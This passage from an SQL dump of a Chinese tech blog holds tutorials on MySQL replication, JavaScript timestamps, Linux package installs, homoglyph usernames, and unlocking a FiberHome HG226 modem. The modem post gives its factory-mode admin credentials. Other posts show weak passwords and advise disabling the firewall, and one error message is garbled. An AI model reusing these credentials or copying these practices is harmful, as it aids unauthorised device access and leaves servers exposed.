消息。</p>\r\n\r\n<p>29.尽量避免大事务操作，提高系统并发能力。</p>\r\n\r\n<p>30.尽量避免向客户端返回大数据量，若数据量过大，应该考虑相应需求是否合理。</p>\r\n',0,1437292194,0,0),(28,25,'mysql之主从复制篇','<p>在实际企业应用环境当中，单台mysql数据库是不足以满足日后业务需求的。譬如服务器发生故障，没有备份服务器来提供服务的话，业务就得停止。介于这种情况，我们来学习一下mysql主从复制。</p>\r\n\r\n<p>使用mysql主从复制的好处有：</p>\r\n\r\n<p>1、采用主从服务器这种架构，稳定性得以提升。如果主服务器发生故障，我们可以使用从服务器来提供服务。</p>\r\n\r\n<p>2、在主从服务器上分开处理用户的请求，可以提升数据处理效率。</p>\r\n\r\n<p>3、将主服务器上的数据复制到从服务器上，保护数据免受意外的损失。</p>\r\n\r\n<p>环境描述：</p>\r\n\r\n<p>新企业要搭建架构为主从复制的mysql数据库。</p>\r\n\r\n<p>主服务器（mysql-master）：IP地址：192.168.48.128，mysql已安装，没有用户数据。</p>\r\n\r\n<p>从服务器（mysql-slave）：IP地址：192.168.48.130，mysql已安装，没有用户数据。</p>\r\n\r\n<p>主从服务器均可正常提供服务。</p>\r\n\r\n<p><img alt=\"\" src=\"/data/pic/20150719160725550604.jpg\" style=\"height:358px; width:554px\" /></p>\r\n\r\n<p>主从复制配置如下：</p>\r\n\r\n<p>在主服务器上操作：</p>\r\n\r\n<p>1)、确保/etc/my.cnf中有如下参数，没有的话需手工添加，并重启mysql服务。</p>\r\n\r\n<p>[mysqld]</p>\r\n\r\n<p>log-bin=mysql-bin 启动二进制文件</p>\r\n\r\n<p>server-id=1 服务器ID</p>\r\n\r\n<p>2)、登录mysql，在mysql中添加一个backup的账号，并授权给从服务器。</p>\r\n\r\n<p>[root@localhost ~]# mysql -uroot &ndash;p123456 登录mysql</p>\r\n\r\n<p>mysql&gt; grant replication slave on *.* to &#39;backup&#39;@&#39;192.168.48.130&#39; identified by &#39;backup&#39;; 创建backup用户，并授权给192.168.48.130使用。</p>\r\n\r\n<p><img alt=\"\" src=\"/data/pic/20150719161752720095.jpg\" style=\"height:263px; width:644px\" /></p>\r\n\r\n<p>3)、查询主数据库状态，并记下FILE及Position的值，这个在后面配置从服务器的时候要用到。</p>\r\n\r\n<p>mysql&gt; show master status;</p>\r\n\r\n<p><img alt=\"\" src=\"/data/pic/20150719161819669668.jpg\" style=\"height:190px; width:644px\" /></p>\r\n\r\n<p>在从服务器上操作：</p>\r\n\r\n<p>1)、确保/etc/my.cnf中有log-bin=mysql-bin和server-id=1参数，并把server-id=1修改为server-id=10。修改之后如下所示：</p>\r\n\r\n<p>[mysqld]</p>\r\n\r\n<p>log-bin=mysql-bin 启动二进制文件</p>\r\n\r\n<p>server-id=10 服务器ID</p>\r\n\r\n<p>2）、重启mysql服务。</p>\r\n\r\n<p>[root@localhost ~]# mysqladmin -p123456 shutdown<br />\r\n[root@localhost ~]# mysqld_safe --user=mysql &amp;</p>\r\n\r\n<p><img alt=\"\" src=\"/data/pic/20150719161949532833.jpg\" style=\"height:112px; width:644px\" /></p>\r\n\r\n<p>3)、登录mysql，执行如下语句</p>\r\n\r\n<p>[root@localhost ~]# mysql -uroot &ndash;p123456</p>\r\n\r\n<p>mysql&gt; change master to master_host=&#39;192.168.48.128&#39;,master_user=&#39;backup&#39;,master_password=&#39;backup&#39;,master_log_file=&#39;mysql-bin.000003&#39;,master_log_pos=401;</p>\r\n\r\n<p><img alt=\"\" src=\"/data/pic/20150719162038800103.jpg\" style=\"height:275px; width:644px\" /></p>\r\n\r\n<p>4)、启动slave同步。</p>\r\n\r\n<p>mysql&gt; start slave;</p>\r\n\r\n<p><img alt=\"\" src=\"/data/pic/20150719162106300885.jpg\" style=\"height:164px; width:644px\" /></p>\r\n\r\n<p>5)、检查主从同步，如果您看到Slave_IO_Running和Slave_SQL_Running均为Yes，则主从复制连接正常。</p>\r\n\r\n<p>mysql&gt; show slave status\\G</p>\r\n\r\n<p><img alt=\"\" src=\"/data/pic/20150719162135821884.jpg\" style=\"height:590px; width:648px\" /></p>\r\n\r\n<p>验证配置是否正常，mysql主从能否正常复制。</p>\r\n\r\n<p>在主数据库上新建一个库，并且在库中写一个表和一些数据。</p>\r\n\r\n<p>[root@localhost ~]# mysql -uroot &ndash;p123456</p>\r\n\r\n<p>mysql&gt; create database mysqltest;</p>\r\n\r\n<p>mysql&gt; use mysqltest;</p>\r\n\r\n<p>mysql&gt; create table user(id int(5),name char(10));</p>\r\n\r\n<p>mysql&gt; insert into user values (00001,&#39;zhangsan&#39;);</p>\r\n\r\n<p><img alt=\"\" src=\"/data/pic/20150719162204145867.jpg\" style=\"height:352px; width:644px\" /></p>\r\n\r\n<p>在从数据库中验证一下，是否正常复制到数据。</p>\r\n\r\n<p>[root@localhost ~]# mysql -uroot &ndash;p123456</p>\r\n\r\n<p>mysql&gt; show databases;</p>\r\n\r\n<p><img alt=\"\" src=\"/data/pic/20150719162228692025.jpg\" style=\"height:147px; width:645px\" /></p>\r\n\r\n<p>mysql&gt; select * from mysqltest.user;</p>\r\n\r\n<p><img alt=\"\" src=\"/data/pic/20150719162320412094.jpg\" style=\"height:109px; width:645px\" /></p>\r\n\r\n<p>从上图中的结果，我们可以看到mysql主从复制已经在起作用了，我们在主数据库中写入的数据已经复制到我们的从数据库中了。</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>环境如下：</p>\r\n\r\n<p>单台数据库存有数据，要升级为主从复制的架构。</p>\r\n\r\n<p>主数据库：mysql-master：IP192.168.48.128，数据库正常提供服务，有数据。</p>\r\n\r\n<p>从数据库：mysql-slave：IP192.168.48.130，数据库正常提供服务，无数据。</p>\r\n\r\n<p><img alt=\"\" src=\"/data/pic/20150719162425587655.jpg\" style=\"height:362px; width:558px\" /></p>\r\n\r\n<p>升级大致步骤如下：</p>\r\n\r\n<p>1、修改主数据库配置文件，开启总从复制必要的功能。</p>\r\n\r\n<p>2、在主数据库中创建一个账号并授权给从数据库使用。</p>\r\n\r\n<p>3、导出主数据库中的数据作。</p>\r\n\r\n<p>4、修改从数据库配置文件，开启总从复制必要的功能。</p>\r\n\r\n<p>5、把刚才主数据库中导出的数据导入到从数据库。</p>\r\n\r\n<p>6、在从数据库中配置连接主数据库要用到的账户、密码等。</p>\r\n\r\n<p>7、启动主从复制功能，并检查是否正常复制。</p>\r\n\r\n<p>开始升级:</p>\r\n\r\n<p>在主数据库上操作：</p>\r\n\r\n<p>1)、确保/etc/my.cnf中有如下参数，没有的话需手工添加，并重启mysql服务。</p>\r\n\r\n<p>[mysqld]</p>\r\n\r\n<p>log-bin=mysql-bin 启动二进制文件</p>\r\n\r\n<p>server-id=1 服务器ID</p>\r\n\r\n<p>2)、登录mysql，在mysql中添加一个backup的账号，并授权给从服务器。</p>\r\n\r\n<p>[root@localhost ~]# mysql -uroot &ndash;p123456 登录mysql</p>\r\n\r\n<p>mysql&gt; grant replication slave on *.* to &#39;backup&#39;@&#39;192.168.48.130&#39; identified by &#39;backup&#39;; 创建backup用户，并授权给192.168.48.130使用。</p>\r\n\r\n<p><img alt=\"\" src=\"/data/pic/20150719162508369192.jpg\" style=\"height:265px; width:644px\" /></p>\r\n\r\n<p>3)、查看已有的数据库有哪些；</p>\r\n\r\n<p>mysql&gt; show databases;</p>\r\n\r\n<p><img alt=\"\" src=\"/data/pic/20150719162534203326.jpg\" style=\"height:180px; width:644px\" /></p>\r\n\r\n<p>4)、进行锁表操作，不让数据进行写入动作，这么做事为了防止从数据库的原始数据和主数据库的原始数据不一致。</p>\r\n\r\n<p>mysql&gt; flush tables with read lock;</p>\r\n\r\n<p><img alt=\"\" src=\"/data/pic/20150719162605604766.jpg\" style=\"height:144px; width:644px\" /></p>\r\n\r\n<p>5)、查询主数据库状态，并记下FILE及Position的值，这个在后面配置从服务器的时候要用到。</p>\r\n\r\n<p>mysql&gt; show master status;</p>\r\n\r\n<p><img alt=\"\" src=\"/data/pic/20150719162631618334.jpg\" style=\"height:156px; width:644px\" /></p>\r\n\r\n<p>6)、切换一个终端，使用mysqldump命令将刚才查询到的两个库导出来。</p>\r\n\r\n<p>mysql&gt; mysqldump &ndash;uroot &ndash;p123456 mysqltest &amp;gt; mysqltest.sql</p>\r\n\r\n<p>mysql&gt; mysqldump &ndash;uroot &ndash;p123456 test1234 &amp;gt; test1234.sql</p>\r\n\r\n<p><img alt=\"\" src=\"/data/pic/20150719162702885659.jpg\" style=\"height:115px; width:644px\" /></p>\r\n\r\n<p>7)、将导出来的库文件传送到从数据库的/root目录下。</p>\r\n\r\n<p>[root@localhost ~]#scp mysqltest.sql test1234.sql root@192.168.48.130:/root/</p>\r\n\r\n<p>这中间需要输入一次验证口令。见下图</p>\r\n\r\n<p><img alt=\"\" src=\"/data/pic/20150719162748324670.jpg\" style=\"height:138px; width:644px\" /></p>\r\n\r\n<p>8)、切换回之前的终端，进行表解锁操作。</p>\r\n\r\n<p>mysql&gt; unlock tables;</p>\r\n\r\n<p><img alt=\"\" src=\"/data/pic/20150719162833939685.jpg\" style=\"height:84px; width:644px\" /></p>\r\n\r\n<p>主数据库服务器上的操作告一段落。</p>\r\n\r\n<p>在从数据库上操作：</p>\r\n\r\n<p>1)、确保/etc/my.cnf中有log-bin=mysql-bin和server-id=1参数，并把server-id=1修改为server-id=10。修改之后如下所示：</p>\r\n\r\n<p>[mysqld]</p>\r\n\r\n<p>log-bin=mysql-bin 启动二进制文件</p>\r\n\r\n<p>server-id=10 服务器ID</p>\r\n\r\n<p>2)、重启mysql服务。</p>\r\n\r\n<p>[root@localhost ~]# mysqladmin -p123456 shutdown<br />\r\n[root@localhost ~]# mysqld_safe --user=mysql &amp;</p>\r\n\r\n<p><img alt=\"\" src=\"/data/pic/20150719162904183551.jpg\" style=\"height:115px; width:644px\" /></p>\r\n\r\n<p>3)、登录数据库，确认要同步的库名不存在。</p>\r\n\r\n<p>[root@localhost ~]# mysql -uroot &ndash;p123456</p>\r\n\r\n<p>mysql&gt; show databases;</p>\r\n\r\n<p><img alt=\"\" src=\"/data/pic/20150719162948580377.jpg\" style=\"height:294px; width:644px\" /></p>\r\n\r\n<p>4)、创建名为mysqltest和test1234的库。</p>\r\n\r\n<p>mysql&gt; create database mysqltest;</p>\r\n\r\n<p>mysql&gt; create database test1234;</p>\r\n\r\n<p><img alt=\"\" src=\"/data/pic/20150719163054368753.jpg\" style=\"height:100px; width:644px\" /></p>\r\n\r\n<p>4)、切换一个终端，将传过来的两个数据文件分别导入对应的数据库下。</p>\r\n\r\n<p>[root@localhost ~]# mysql -uroot &ndash;p123456 mysqltest &lt; mysqltest.sql</p>\r\n\r\n<p>[root@localhost ~]# mysql -uroot &ndash;p123456 test1234 &amp;lt; test1234.sql</p>\r\n\r\n<p><img alt=\"\" src=\"/data/pic/20150719163118724517.jpg\" style=\"height:103px; width:644px\" /></p>\r\n\r\n<p>5)、切换回之前的终端，执行如下语句</p>\r\n\r\n<p>mysql&gt; change master to master_host=&#39;192.168.48.128&#39;,master_user=&#39;backup&#39;,master_password=&#39;backup&#39;,master_log_file=&#39;mysql-bin.000003&#39;,master_log_pos=1650;</p>\r\n\r\n<p>6)、启动主从复制功能。</p>\r\n\r\n<p>mysql&gt; start slave;</p>\r\n\r\n<p><img alt=\"\" src=\"/data/pic/20150719163256172372.jpg\" style=\"height:107px; width:644px\" /></p>\r\n\r\n<p>7)、</p>\r\n\r\n<p>检查主从同步，如果您看到Slave_IO_Running和Slave_SQL_Running均为Yes，则主从复制连接正常。</p>\r\n\r\n<p>mysql&gt; show slave status\\G</p>\r\n\r\n<p><img alt=\"\" src=\"/data/pic/20150719163325799746.jpg\" style=\"height:570px; width:646px\" /></p>\r\n\r\n<p>验证主从是否正常配置：</p>\r\n\r\n<p>在主数据库上插入数据：</p>\r\n\r\n<p>mysql&gt; show databases;</p>\r\n\r\n<p>mysql&gt; show tables;</p>\r\n\r\n<p>mysql&gt; use mysqltest;</p>\r\n\r\n<p>mysql&gt; select * from user;</p>\r\n\r\n<p>mysql&gt; insert into user values (4,&#39;ergou&#39;);</p>\r\n\r\n<p>mysql&gt; insert into user values (5,&#39;sanwazi&#39;);</p>\r\n\r\n<p><img alt=\"\" src=\"/data/pic/20150719163359905709.jpg\" style=\"height:497px; width:647px\" /></p>\r\n\r\n<p>在从数据库上查看是否正常同步：</p>\r\n\r\n<p>mysql&gt; show databases;</p>\r\n\r\n<p>mysql&gt; use mysqltest;</p>\r\n\r\n<p>mysql&gt; select * from user;</p>\r\n\r\n<p><img alt=\"\" src=\"/data/pic/20150719163458170779.jpg\" style=\"height:340px; width:645px\" /></p>\r\n\r\n<p>上图可以看出，主从之间已经可以正常复制了。</p>\r\n\r\n<p>今天就先到这里吧O(&cap;_&cap;)O~</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p><span style=\"color:#FF0000\">mysql主从复制碰到的小问题</span></p>\r\n\r\n<p>一个朋友在做mysql主从复制的时候碰到了一些问题，他已经按照我之前的教程一步步做了。但是就是不知道是怎么回事。从数据库中使用命令show slave status\\G查看到的结果如下图:</p>\r\n\r\n<p><img alt=\"\" src=\"/data/pic/20150719163542935125.jpg\" style=\"height:558px; width:648px\" /></p>\r\n\r\n<p>我们知道，要想mysql主从复制成功的先决条件是Slave_IO_Running和Slave_SQL_Running均为Yes，而上图所示的结果显然是有一个不满足条件。</p>\r\n\r\n<p>再根据Last_IO_Error的错误代码2013及下面的错误提示我们可以知道，从数据库无法正常连接到主数据库。</p>\r\n\r\n<p>这里原因有三：</p>\r\n\r\n<p>1、主数据库没有给从数据库登录授权</p>\r\n\r\n<p>2、网络不通</p>\r\n\r\n<p>3、有防火墙</p>\r\n\r\n<p>明白这三点之后我们就可以针对原因依次来解决它们：</p>\r\n\r\n<p>登录主数据库，给从数据库授权</p>\r\n\r\n<p>[root@localhost ~]# mysql -uroot &ndash;p123456 登录主数据库</p>\r\n\r\n<p>mysql&gt; grant replication slave on *.* to &#39;backup&#39;@&#39;192.168.48.130&#39; identified by &#39;backup&#39;; 创建backup用户，并授权给从数据库连接使用。</p>\r\n\r\n<p><img alt=\"\" src=\"/data/pic/20150719163703688262.jpg\" style=\"height:263px; width:644px\" /></p>\r\n\r\n<p>检查网络是否通畅</p>\r\n\r\n<p>[root@localhost ~]# ping -c 4 192.168.48.128 再从服务器上ping主服务器。</p>\r\n\r\n<p><img alt=\"\" src=\"/data/pic/20150719163736765524.jpg\" style=\"height:215px; width:644px\" /></p>\r\n\r\n<p>分别在主从服务器上检查防火墙状态</p>\r\n\r\n<p>我们可以直接关闭防火墙</p>\r\n\r\n<p>运行命令：[root@localhost ~]# setup</p>\r\n\r\n<p><img alt=\"\" src=\"/data/pic/20150719163817948419.jpg\" style=\"height:195px; width:644px\" /></p>\r\n\r\n<p>选择防火墙（Firewall configuretion）这一项.</p>\r\n\r\n<p><img alt=\"\" src=\"/data/pic/20150719163900731961.jpg\" style=\"height:360px; width:644px\" /></p>\r\n\r\n<p>将它Disabled掉。</p>\r\n\r\n<p><img alt=\"\" src=\"/data/pic/20150719163931605590.jpg\" style=\"height:360px; width:644px\" /></p>\r\n\r\n<p>或者你可以直接使用命令：</p>\r\n\r\n<p>[root@localhost ~]# service iptables stop 即时生效，系统重启后失效</p>\r\n\r\n<p>[root@localhost ~]# chkconfig iptables off 当前状态无效，系统重启后生效</p>\r\n\r\n<p>大家可以结合使用</p>\r\n\r\n<p><img alt=\"\" src=\"/data/pic/20150719164004398773.jpg\" style=\"height:127px; width:644px\" /></p>\r\n\r\n<p>以上情况都排除完毕，我们来再测试一下主从是否能正常连接。</p>\r\n\r\n<p>在从数据库中执行如下命令：</p>\r\n\r\n<p>mysql&gt;stop slave;</p>\r\n\r\n<p>mysql&gt;start slave;</p>\r\n\r\n<p><img alt=\"\" src=\"/data/pic/20150719164051266525.jpg\" style=\"height:87px; width:646px\" /></p>\r\n\r\n<p>然后查看主从连接状态</p>\r\n\r\n<p>mysql&gt;show slave status\\G</p>\r\n\r\n<p><img alt=\"\" src=\"/data/pic/20150719164115103213.jpg\" style=\"height:590px; width:648px\" /></p>\r\n\r\n<p>经过上述操作，我那位朋友成功排除了主从不能复制的故障。</p>\r\n\r\n<p>故障2：报错如下:</p>\r\n\r\n<p>@MF2K}FVZ7%Y9QEQ_E$2INQ</p>\r\n\r\n<p>意思就是从上的server_id和主的一样的，经查看发现从上的/etc/my.cnf中的server_id=1这行我没有注释掉（在下面复制部分我设置了server_id），于是马上把这行注释掉了，然后重启mysql，发现还是报同样的错误。</p>\r\n\r\n<p>使用如下命令查看了一下server_id</p>\r\n\r\n<p>show variables like &#39;server_id&#39;;</p>\r\n\r\n<p>发现，mysql并没有从my.cnf文件中更新server_id，既然这样就只能手动修改了</p>\r\n\r\n<p>mysql&gt; set global server_id=10; #此处的数值和my.cnf里设置的一样就行<br />\r\nmysql&gt; slave start;</p>\r\n\r\n<p>如此执行后，slave恢复了正常。</p>\r\n\r\n<p>不过稍后蚊子使用/etc/init.d/mysqld restart重启了mysql服务，然后查看slave状态，发现又出现了上面的错误，然后查看server_id发现这个数值又恢复到了1。</p>\r\n\r\n<p>之后蚊子又重新查看了一下/etc/my.cnf的内容，确认应该不是这个文件的问题，于是去google查了一下，看到mysql在启动的时候会查找/etc/my.cnf、DATADIR/my.cnf，USER_HOME/my.cnf。</p>\r\n\r\n<p>本文出自 &ldquo;第三方&rdquo; 博客，请务必保留此出处http://2526575.blog.51cto.com/2516575/689199</p>\r\n',0,1437295304,0,0),(29,1,'JS获取当前时间戳的方法-JavaScript 获取当前时间戳','<p>在网上找了很久JS获取时间戳的方法，很多都走了很多弯路，但是得到是的时间戳却不正确，下面把自己整理的几个JS获取时间戳的方法发到这里，供我的好友分享。</p>\r\n\r\n<p>JavaScript 获取当前时间戳：<br />\r\n第一种方法：<br />\r\nvar timestamp =Date.parse(new Date());</p>\r\n\r\n<p>结果：1280977330000<br />\r\n第二种方法：<br />\r\nvar timestamp =(newDate()).valueOf();</p>\r\n\r\n<p>结果：1280977330748</p>\r\n\r\n<p>第三种方法：<br />\r\nvar timestamp=newDate().getTime()；</p>\r\n\r\n<p>结果：1280977330748</p>\r\n\r\n<p>第一种：获取的时间戳是把毫秒改成000显示，</p>\r\n\r\n<p>第二种和第三种是获取了当前毫秒的时间戳。</p>\r\n',0,1437295453,0,0),(30,26,'光纤 破解 HG226 桥接 TP Link','<p>昨天晚上搞到12点。。。没连上。。。网上找的桥接的资料全都不对。。。<br />\r\n今天白天和同学聚完回来，用了移动的G3无线网卡。。。可惜住在荒郊野外。。。我跑的都比网速快。。。。。于是痛下决心。。。见下~~~<br />\r\n光纤路由器为fiberhome<br />\r\n无线路由器为TP Link</p>\r\n\r\n<p>将电脑的网线与HG226直连<br />\r\n在IE中输入192.168.1.1<br />\r\n会得到如下：</p>\r\n\r\n<p><img alt=\"\" src=\"/data/pic/20150719165105377871.jpg\" style=\"height:281px; width:600px\" /></p>\r\n\r\n<p>输入出厂模式下的用户名和密码：<br />\r\n用户名fiberhomehg2x0 密码 hg2x0</p>\r\n\r\n<p>进行修改如下：</p>\r\n\r\n<p><img alt=\"\" src=\"/data/pic/20150719165129935784.jpg\" style=\"height:629px; width:523px\" /></p>\r\n\r\n<p>并修改桥接模式如下</p>\r\n\r\n<p><img alt=\"\" src=\"/data/pic/20150719165152558102.jpg\" style=\"height:541px; width:600px\" /></p>\r\n\r\n<p>保存重启。</p>\r\n\r\n<p>然后接上TP Link。。。<br />\r\n你会发现192.168.1.1连不上路由器。。。。为什么，不清楚，有冲突。。。<br />\r\n这个时候呢，将TP Link出厂设置，按住小暗钮。。。数几十只小羊。。。然后F5之后，就可以admin/admin了。。。。<br />\r\n第一步，the first step！！设置LAN的IP地址。。。设192.168.100.1，反正不是192.168.1.1，<br />\r\n第二步，拨号吧，设无线吧。。。<br />\r\n第三步，你成功了。。。。</p>\r\n\r\n<p>所以你瞧。。。我终于用上电脑写日志啦。。。<br />\r\n哈哈哈哈哈</p>\r\n',0,1437295932,0,0),(31,1,'正则表达式\\w并不完全等于[A-Za-z0-9]','<p>不管是书本上还是网上的教程,在正则表达式中\\w都被介绍为匹配任何单词字符,包括字母和下划线，等效于[A-Za-z0-9]<br />\r\n今天偶然间发现会员注册中出现了一个恶作剧账号&quot;аdmin&quot;,注意到那个а了没?那是一个俄文字母,在会员注册过滤中使用\\w验证并不能防止。<br />\r\n也就是说\\w包括了英文字母以及俄文字母等，在会员注册这块我们肯定不希望类同的账号出现，要不然很容易造成会员间的误会。所以改为^[A-Za-z0-9\\u4E00-\\u9FA5-]{2,16}$验证，只允许数字、26个英文字母大小写、中文及其组合。<br />\r\n通过网络检测发现，目前的大部分网站账号基本有此误检测的BUG，DZ的不论PHP还是net版均存在此问题。想象一下吧，一个网站已存存在一个英文会员账号&ldquo;admin&rdquo;，再出现一个俄文或俄文英文混合的账号，如&ldquo;аdmin&rdquo;，够混乱吧？</p>\r\n',0,1437296068,0,0),(32,15,'在Linux下载的软件怎么运行?','<p>要经过GCC命令在本机编译后方可使用<br />\r\n在Linux系统中，安装软件最常见的有两种：<br />\r\n一种是软件的源代码，您需要自己动手编译它。这种软件安装包通常是用gzip压缩过的tar包（后缀名为.tar.gz）。<br />\r\n另 一种是软件的可执行程序，你只要安装它就可以了。这种软件安装包通常是一个RPM包（RedHat Linux Packet&nbsp; Manager，就是RedHat的软件包管理器），后缀名是.rpm。当然，也有用RPM格式打包的源代码、用gzip压缩过的可执行套装程序。只要您 理解了以下的思路，这两种形式的安装包也不在话下了。</p>\r\n\r\n<p>源代码编译安装</p>\r\n\r\n<p>Linux软件的源代码分发是指提供了该软件所有程序源代码的发布形式，需要用户自己编译成可执行的二进制码并进行安装。其优点是配置灵活，可以随意去掉或保留某些功能/模块，适应多种硬件/操作系统平台及编译环境；缺点是难度较大，一般不适合初学者使用。</p>\r\n\r\n<p>各个软件的源代码包一般都在各个软件项目的主页中提供下载，例如：www.apache.org等。</p>\r\n\r\n<p>1．*.src.rpm形式的源代码软件包</p>\r\n\r\n<p>安装：</p>\r\n\r\n<p>rpm -rebuild *.src.rpm</p>\r\n\r\n<p>cd /usr/src/dist/RPMS</p>\r\n\r\n<p>rpm -ivh *.rpm</p>\r\n\r\n<p>卸载：</p>\r\n\r\n<p>rpm -e packgename</p>\r\n\r\n<p>说明：rpm --rebuild *.src.rpm命令将源代码编译并在/usr/src/dist/RPMS下生成二进制的RPM软件包，然后再安装该二进制包即可。Packgename如前所述。</p>\r\n\r\n<p>2．*.tar.gz/*.tgz/*.bz2形式的源代码软件包</p>\r\n\r\n<p>以tar.gz或tgz或tar.bz2等格式结尾的软件包一般都是以源代码方式发布的软件，安装这类软件首先需要对软件进行解压：</p>\r\n\r\n<p># tar zxvf filename.tar.gz</p>\r\n\r\n<p># tar xvfz filename.tgz</p>\r\n\r\n<p># tar xvf j filename.tar.bz2</p>\r\n\r\n<p>解压以后，就可以进入解压后的目录：</p>\r\n\r\n<p># cd filename/</p>\r\n\r\n<p>对于这类文档，常见的安装步骤是：配置、编译和安装3步，其中最麻烦的就是配置，因为所有和软件安装相关的配置都是在这一步指定的：比如软件安装位置等。</p>\r\n\r\n<p>配置：./configure</p>\r\n\r\n<p>编译：make</p>\r\n\r\n<p>安装：make install</p>\r\n\r\n<p>卸载：make uninstall 或手动删除</p>\r\n\r\n<p>说 明：建议解压后先阅读说明文件（ReadMe和Install），了解安装的需求，有必要时还需改动编译配置。有些软件包的源代码在编译安装后可以用 make&nbsp; uninstall命令来进行卸载，如果不提供此功能，则软件的卸载必须手动进行。由于软件可能将文件分散地安装在系统的多个目录中，往往很难把它删除干 净，那你应该在编译前进行配置，指定软件将要安装到目标路径：./configure --prefix=目录名，这样可以使用&ldquo;rm -rf&nbsp; 软件目录名&rdquo;命令来进行干净彻底的卸载。与其他安装方式相比，需要用户自己编译安装是最难的，它适合于使用Linux已有一定经验的人，一般不推荐初学者 使用。</p>\r\n\r\n<p>RPM格式软件包的安装</p>\r\n\r\n<p>RPM是RedHat公司开发的软件包管理器，使用它可以很容易地对RPM形式的软件 包进行安装、升级、卸载、验证、查询等操作，安装简单，而卸载时也可以将软件安装在多处目录中的文件删除干净，因此推荐初学者尽可能使用RPM形式的软件 包。软件包往往有特定的命令规范，名字是由&ldquo;文件名+版本号+.&nbsp; rpm&rdquo;组成的字串，例如apache-3.1.12-i386.rpm和apache-devel-3.1.12-i386.rpm，它们的软件包名称 分别是apache和apache-devel。各个支持RPM格式的Linux常见软件的RPM包可以在网站rpmfind.net中找到。</p>\r\n\r\n<p>1．安装</p>\r\n\r\n<p>命令格式：</p>\r\n\r\n<p>rpm-i(or--install) options file1.rpm ... fileN.rpm</p>\r\n\r\n<p>参数：</p>\r\n\r\n<p>file1.rpm...fileN.rpm指将要安装的RPM包的文件名。</p>\r\n\r\n<p>详细选项：</p>\r\n\r\n<p>-h(or &mdash;hash)安装时输出hash记号；test只对安装进行测试，并不实际安装；--percent以百分比的形式输出安装的进度；--&nbsp; excludedocs不安装软件包中的文档；--includedocs安装文档；--replacepkgs强制重新安装已经安装的软件包；--&nbsp; replacefiles替换属于其他软件包的文件；--force忽略软件包及文档的冲突；--noscripts不运行预安装和后安装脚本；--&nbsp; prefix&nbsp; NEWPATH将软件包安装到由NEWPATH指定的路径下；--ignorearch不校验软件包的结构；--ignoreos不检查软件包运行的操作 系统；--nodeps不检查依赖性关系；--ftpproxy HOST用HOST作为FTP代理；--ftpport&nbsp; PORT指定FTP的端口号为PORT。</p>\r\n\r\n<p>通用选项：</p>\r\n\r\n<p>-v显示附加信息；-vv显示调试信息；--root&nbsp; DIRECTORY让RPM将DIRECTORY指定的路径作为根目录，这样预安装程序和后安装程序都会安装到这个目录下；--rcfile&nbsp; FILELIST设置rpmrc文档为FILELIST；--dbpath DIRECTORY设置RPM资料库所在的路径为DIRECTORY。</p>\r\n\r\n<p>2．删除</p>\r\n\r\n<p>命令格式：</p>\r\n\r\n<p>rpm -e(or--erase) options pkg1 ... pkgN</p>\r\n\r\n<p>参数：</p>\r\n\r\n<p>pkg1...pkgN：要删除的软件包。</p>\r\n\r\n<p>详细选项：</p>\r\n\r\n<p>--test只执行删除的测试；--noscripts不运行预安装和后安装脚本程序；--nodeps不检查依赖性。</p>\r\n\r\n<p>通用选项：</p>\r\n\r\n<p>-vv 显示调试信息；--root&nbsp; DIRECTORY让RPM将DIRECTORY指定的路径作为根目录，这样预安装程序和后安装程序都会安装到这个目录下；--rcfile&nbsp; FILELIST设置rpmrc文档为FILELIST；--dbpath DIRECTORY设置RPM资料库所在的路径为DIRECTORY。</p>\r\n\r\n<p>3．升级</p>\r\n\r\n<p>命令格式：</p>\r\n\r\n<p>rpm -U(or--upgrade) options file1.rpm ... fileN.rpm</p>\r\n\r\n<p>参数：</p>\r\n\r\n<p>file1.rpm...fileN.rpm指软件包的名字。</p>\r\n\r\n<p>详细选项：</p>\r\n\r\n<p>-h(or &mdash;hash)安装时输出hash记号；&mdash;oldpackage允许一个旧版本；--test只进行升级测试；--excludedocs不安装软件包中的 文件；--includedocs安装文件；--replacepkgs强制重新安装已经安装的软件包；--replacefiles替换属于其他软件包 的文件；--force忽略软件包及文件的冲突；--percent以百分比的形式输出安装的进度；--noscripts不运行预安装和后安装脚 本；--prefix&nbsp; NEWPATH将软件包安装到由NEWPATH指定的路径下；--ignorearch不校验软件包的结构；--ignoreos不检查软件包运行的操作 系统；--nodeps不检查依赖性关系；--ftpproxy HOST用HOST作为FTP代理；--ftpport&nbsp; HOST指定FTP的埠号为HOST。</p>\r\n\r\n<p>通用选项：</p>\r\n\r\n<p>-v显示附加信息；-vv显示调试信息；--root&nbsp; DIRECTORY让RPM将DIRECTORY指定的路径作为根目录，这样预安装程序和后安装程序都会安装到这个目录下；--rcfile&nbsp; FILELIST设置rpmrc文件为FILELIST ；--dbpath DIRECTORY设置RPM资料库所在的路径为DIRECTORY。</p>\r\n\r\n<p>4．查询</p>\r\n\r\n<p>命令格式：</p>\r\n\r\n<p>rpm -q(or--query) options</p>\r\n\r\n<p>参数：</p>\r\n\r\n<p>pkg1...pkgN：查询已安装的软件包。</p>\r\n\r\n<p>详细选项：</p>\r\n\r\n<p>-p&nbsp; PACKAGE_FILE查询软件包的文件；-f FILE查询FILE属于哪个软件包；-a查询所有安装的软件包；--whatproVides&nbsp; CAPABILITY查询提供了CAPABILITY功能的软件包；-g group查询属于group组的软件包；--whatrequires&nbsp; CAPABILITY查询所有需要CAPABILITY功能的软件包。</p>\r\n\r\n<p>选项：</p>\r\n\r\n<p>-i显示软件包的概要信息；-l显示软 件包中的文件列表；-c显示配置文件列表；-d显示文件列表；-s显示软件包中文档列表并显示每个文件的状态&nbsp; -；-scripts显示安装、卸载、校验脚本；--queryformat(or--qf)以用户指定的方式显示查询信息；--dump显示每个文件的 所有已校验信息；--proVides显示软件包提供的功能；--requires(or-R)显示软件包所需的功能。</p>\r\n\r\n<p>通用选项：</p>\r\n\r\n<p>-v 显示附加信息；-vv显示调试信息；--root&nbsp; DIRECTORY让RPM将DIRECTORY指定的路径作为根目录，这样预安装程序和后安装程序都会安装到这个目录下；-rcfile&nbsp; FILELIST设置rpmrc文件为FILELIST；--dbpath DIRECTORY设置RPM资料库所在的路径为DIRECTORY。</p>\r\n\r\n<p>5．校验已安装的软件包</p>\r\n\r\n<p>命令格式：</p>\r\n\r\n<p>rpm -V(or--verify,or-y) 